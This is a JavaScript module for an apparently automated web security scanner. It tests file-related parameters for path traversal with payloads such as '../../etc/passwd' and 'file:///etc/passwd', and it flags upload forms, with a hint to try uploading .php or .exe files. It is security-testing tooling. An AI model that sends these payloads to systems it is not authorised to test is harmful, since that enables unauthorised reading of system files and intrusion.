const BaseAgent = require('./baseAgent');
const { makeRequest } = require('../utils/httpClient');

class PathTraversalAgent extends BaseAgent {
    constructor(logger, memory, findingsStore, registryRef = null) {
        super('PathTraversalAgent', 'A03 - Injection & Insecure Resource Access', logger, memory, findingsStore, registryRef);
        this.goal = "Identify Path Traversal (LFI) and insecure File Upload vulnerabilities by testing file-related parameters and upload forms.";
    }

    /**
     * Calculates confidence for path traversal and file upload findings.
     * @param {object} factors
     * @param {string}  factors.vulnType - 'traversal' | 'uploadTransport' | 'uploadRestriction'
     * @param {boolean} factors.sensitiveFileContent - Whether the response contained system file content (e.g. root:x:)
     * @param {boolean} factors.statusIs200 - HTTP 200 response
     * @param {boolean} factors.paramNameRelevant - Parameter name strongly matches file-related pattern
     * @param {boolean} factors.isHttp - Upload form uses HTTP (not HTTPS)
     * @param {boolean} factors.hasFileInput - Form has a file input element
     * @returns {number} Confidence score between 0.1 and 1.0
     */
    _calculateConfidence({ vulnType, sensitiveFileContent = false, statusIs200 = false, paramNameRelevant = false, isHttp = false, hasFileInput = false }) {
        let score = 0;

        switch (vulnType) {
            case 'traversal':
                score = 0.2;
                if (sensitiveFileContent) score += 0.5;     // definitive proof of LFI
                if (statusIs200) score += 0.1;
                if (paramNameRelevant) score += 0.1;
                break;
            case 'uploadTransport':
                score = 0.25;
                if (isHttp) score += 0.3;                   // insecure transport confirmed
                if (hasFileInput) score += 0.15;
                break;
            case 'uploadRestriction':
                score = 0.15;                               // low base – needs manual verification
                if (hasFileInput) score += 0.15;
                break;
            default:
                score = 0.3;
        }

        return Math.max(0.1, Math.min(1.0, parseFloat(score.toFixed(2))));
    }

    async execute(target) {
        this.logger.info(`[PathTraversalAgent] Goal: ${this.goal}`);
        const { forms, parameters } = this.memory.attackSurface;

        // 1. Path Traversal Tests
        const fileParams = parameters.filter(p =>
            /file|path|src|img|doc|url|template|include|page|view/i.test(p.param)
        );

        for (const param of fileParams.slice(0, 10)) {
            await this._testPathTraversal(param.url, param.param);
        }

        // 2. File Upload Tests
        const uploadForms = forms.filter(f =>
            f.inputs.some(i => i.type === 'file') || /upload|import|file/i.test(f.action)
        );

        for (const form of uploadForms.slice(0, 5)) {
            await this._testFileUpload(form);
        }

        return [];
    }

    async _testPathTraversal(url, param) {
        const payloads = [
            '../../etc/passwd',
            '..\\..\\windows\\win.ini',
            '/etc/passwd',
            '....//....//....//etc/passwd',
            'file:///etc/passwd'
        ];

        for (const payload of payloads) {
            try {
                const { appendParam } = require('../utils/urlHelper');
                const testUrl = appendParam(url, param, payload);
                const res = await makeRequest(testUrl, { retries: 0 });

                const body = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
                if (res.status === 200 && (body.includes('root:x:') || body.includes('[extensions]'))) {
                    this.addFinding({
                        type: 'Path Traversal',
                        endpoint: url,
                        parameter: param,
                        description: 'Local File Inclusion / Path Traversal via sensitive parameters',
                        evidence: `Payload ${payload} returned sensitive file content`,
                        confidenceScore: this._calculateConfidence({ vulnType: 'traversal', sensitiveFileContent: true, statusIs200: true, paramNameRelevant: /file|path|src|include|template/i.test(param) }),
                        impact: 'Full system compromise, data theft',
                        reproductionSteps: [`Open ${testUrl} and check for sensitive file contents`]
                    });
                    break;
                }
            } catch (_) { }
        }
    }

    async _testFileUpload(form) {
        // Simplified check for insecure upload configuration
        if (!form.action.startsWith('https:')) {
            this.addFinding({
                type: 'Insecure File Upload',
                endpoint: form.action,
                description: 'File upload form uses insecure transport',
                confidenceScore: this._calculateConfidence({ vulnType: 'uploadTransport', isHttp: true, hasFileInput: form.inputs.some(i => i.type === 'file') }),
                impact: 'Interception of uploaded files',
                reproductionSteps: [`Inspect upload form at ${form.action}`]
            });
        }

        // Logical check for potential restricted extension bypass
        this.addFinding({
            type: 'Insecure Design (File Upload)',
            endpoint: form.action,
            description: 'Unrestricted file upload candidate - needs verification for extension filtering',
            evidence: `Upload form found at ${form.action}`,
            confidenceScore: this._calculateConfidence({ vulnType: 'uploadRestriction', hasFileInput: form.inputs.some(i => i.type === 'file') }),
            impact: 'Remote Code Execution (RCE)',
            reproductionSteps: [`Manually test ${form.action} by uploading .php, .asp, or .exe files`]
        });
    }
}

module.exports = PathTraversalAgent;
